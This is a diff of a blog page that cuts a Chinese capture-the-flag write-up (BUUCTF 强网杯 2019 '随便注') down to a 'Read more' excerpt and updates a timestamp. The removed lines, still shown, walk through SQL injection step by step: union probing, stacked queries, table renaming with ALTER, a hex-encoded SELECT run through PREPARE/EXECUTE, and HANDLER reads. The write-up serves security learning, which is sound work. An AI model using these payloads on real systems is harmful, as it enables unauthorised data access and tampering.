@@ -170,7 +170,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-03-23 17:36:28 / Modified: 17:51:55" itemprop="dateCreated datePublished" datetime="2021-03-23T17:36:28+08:00">2021-03-23</time>
+              <time title="Created: 2021-03-23 17:36:28 / Modified: 17:53:33" itemprop="dateCreated datePublished" datetime="2021-03-23T17:36:28+08:00">2021-03-23</time>
             </span>
 
           
@@ -187,54 +187,14 @@
           <p>尝试注入</p>
 <p>测试 1’ or 1=1 # ,初步判定存在SQL注入</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
-<img src="/2021/03/23/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/1.png" class>
-
-<p>尝试获取列数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 1#</span><br><span class="line">1&#39; order by 2#</span><br><span class="line">1&#39; order by 3#  报错</span><br></pre></td></tr></table></figure>
-<p>得出列数为2</p>
-<p>尝试得出回显位</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2#</span><br></pre></td></tr></table></figure>
-<img src="/2021/03/23/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.png" class>
-
-<p>发现过滤了select等一些字符,经过双写,大小写等绕过发现都行不通,报错注入于是也被pass掉,于是想到了堆叠注入。</p>
-<p>原理很简单，就是通过 ; 号注入多条SQL语句。</p>
-<p>先通过show databases爆出数据库。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;; show databases; #</span><br></pre></td></tr></table></figure>
-<img src="/2021/03/23/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.png" class>
-
-<p>接着通过0’; show databases; #爆出表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;; show databases; #</span><br></pre></td></tr></table></figure>
-<img src="/2021/03/23/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.png" class>
-
-<p>查一下两个表中的字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;; show columns from &#96;1919810931114514&#96;; #</span><br></pre></td></tr></table></figure>
-<img src="/2021/03/23/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.png" class>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;; show columns from words; #</span><br></pre></td></tr></table></figure>
-<img src="/2021/03/23/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" class>
-
-<p>可以看出flag存在 1919810931114514 中,但想要查询这个flag需要用到的语句是 接下来要读取此字段内的数据，我们要执行的目标语句是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;1919810931114514&#96;;</span><br></pre></td></tr></table></figure>
-<p>这里需要绕过select的限制.</p>
-<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id。</p>
-<p>这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag<br>将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0&#39;; alter table words rename to words1;alter table &#96;1919810931114514&#96; rename to words;alter table words change flag id varchar(50);#</span><br><span class="line"></span><br><span class="line">拆分开来如下</span><br><span class="line">0&#39;;</span><br><span class="line">alter table words rename to words1;               words表名改为words1</span><br><span class="line">alter table &#96;1919810931114514&#96; rename to words;   1919810931114514表名改为words</span><br><span class="line">alter table words change flag id varchar(50);     将现在的words表中的flag列名改为id</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
-<p>然后在输入1’ or 1 =1#即可得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ or 1 &#x3D;1#</span><br></pre></td></tr></table></figure>
-<img src="/2021/03/23/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.png" class>
-
-<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>因为select被过滤了，所以先将select * from <code>1919810931114514</code>进行16进制编码</p>
-<p>再通过构造payload得</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# </span><br></pre></td></tr></table></figure>
-<p>进而得到flag</p>
-<p>prepare…from…是预处理语句，会进行编码转换。<br>execute用来执行由SQLPrepare创建的SQL语句。<br>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p>
-<img src="/2021/03/23/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/8.png" class>
-
-<h2 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h2><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如：通过handler语句查询users表的内容</span><br><span class="line">handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler yunensec read first; #读取指定表&#x2F;句柄的首行数据</span><br><span class="line">handler yunensec read next; #读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">handler yunensec read next; #读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">...</span><br><span class="line">handler yunensec close; #关闭句柄</span><br></pre></td></tr></table></figure>
-<p>最终payload为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;; handler &#96;1919810931114514&#96; open as &#96;a&#96;; handler &#96;a&#96; read next;#</span><br></pre></td></tr></table></figure>
-<img src="/2021/03/23/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/9.png" class>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/03/23/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
